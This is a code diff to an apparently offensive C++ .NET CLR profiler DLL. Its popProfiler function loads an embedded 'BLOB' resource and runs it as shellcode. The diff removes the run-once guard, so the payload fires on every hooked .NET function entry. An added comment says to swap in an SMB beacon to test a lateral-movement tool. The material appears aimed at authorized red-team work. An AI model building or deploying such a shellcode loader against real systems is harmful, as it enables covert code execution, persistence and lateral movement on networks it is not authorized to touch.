@@ -25,8 +25,6 @@
 #endif
 #include "OS.h"
 
-bool executed = FALSE;
-
 HRESULT __stdcall CoreProfiler::QueryInterface(REFIID riid, void** ppvObject) {
 	if (ppvObject == nullptr)
 		return E_POINTER;
@@ -80,15 +78,13 @@ void popProfiler() {
 	DWORD _tmp;
 	void* exec;
 
-	// set flag so further .NET functions are not hooked
-	executed = true;
-
 	// Use the exported function "PleaseFindMe" to get a handle to this DLL
 	GetModuleHandleExA(GET_MODULE_HANDLE_EX_FLAG_FROM_ADDRESS | GET_MODULE_HANDLE_EX_FLAG_UNCHANGED_REFCOUNT,
 		(LPCSTR)&PleaseFindMe, &hm);
 	
 	// Find the payload resource - make sure the int lines up with what you resource's ID is in the "resource symbols" table of the project
 	// See https://www.ired.team/offensive-security/code-injection-process-injection/loading-and-executing-shellcode-from-portable-executable-resources
+	// REPLACE THIS RESOURCE WITH AN SMB BEACON TO TEST THE ASSOCIATED LATERAL MOVEMENT BOF! THE MESSAGEBOX WILL NOT DISPLAY
 	profileResource = FindResourceW(hm, MAKEINTRESOURCE(101), L"BLOB");
 
 	// Load the resource into a buffer
@@ -106,9 +102,8 @@ void popProfiler() {
 }
 
 void NakedEnter(FunctionID /*funcID*/) {
-	if (!executed) {
-		popProfiler();
-	}
+
+	popProfiler();
 	return;
 }
 
